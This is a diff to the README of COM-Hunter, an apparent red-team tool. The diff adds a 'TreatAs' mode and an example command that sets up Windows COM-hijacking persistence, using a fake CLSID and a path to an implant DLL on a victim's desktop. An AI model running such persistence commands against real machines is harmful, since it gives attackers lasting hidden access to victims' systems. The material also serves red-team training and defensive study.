@@ -65,12 +65,13 @@ Inspired by the [RTO course](https://courses.zeropointsecurity.co.uk/courses/red
                              @nickvourd && @S1ckB0y1337
                   ~ Inspired during the RTO course by @zeropointsecltd ~
 
-Usage: COM_Hunter.exe <mode> <options>
+Usage: COM-Hunter.exe <mode> <options>
 
 [+] Modes:
     search             Search Mode
     persist            Classic Persist Mode
     tasksch            Task Scheduler Mode
+    treatas            TreatAs Mode
 
 [+] Search Mode:
 Usage:  COM-Hunter.exe search <CLSID> <options>
@@ -87,6 +88,11 @@ Usage:  COM-Hunter.exe persist <CLSID> <binary_path> <option>
 
 [+] Task Scheduler Mode:
 Usage:  COM-Hunter.exe tasksch <binary_path> <option>
+    -i, --inprocserver32        Set DLL implementation
+    -l, --localserver32         Set EXE implementation
+
+[+] TreatAs Mode:
+Usage:  COM-Hunter.exe treatas <CLSID> <fake_CLSID> <binary_path> <option>
     -i, --inprocserver32        Set DLL implementation
     -l, --localserver32         Set EXE implementation
 ```
@@ -133,6 +139,12 @@ Usage:  COM-Hunter.exe tasksch <binary_path> <option>
 
 ```
 .\COM-Hunter.exe tasksch C:\Users\victim\Desktop\implant.dll --inprocserver32
+```
+
+:information_source: Perform persistence via the TreatAs registry key and a fake (non-forwardable) CLSID using DLL implementation:
+
+```
+.\COM-Hunter.exe treatas AB8902B4-09CA-4bb6-B78D-A8F59079A8D5 "{00000012-1312-1109-2605-F38D1EBDCBE1}" C:\Users\victim\Desktop\implant.dll -i
 ```
 
 ## References
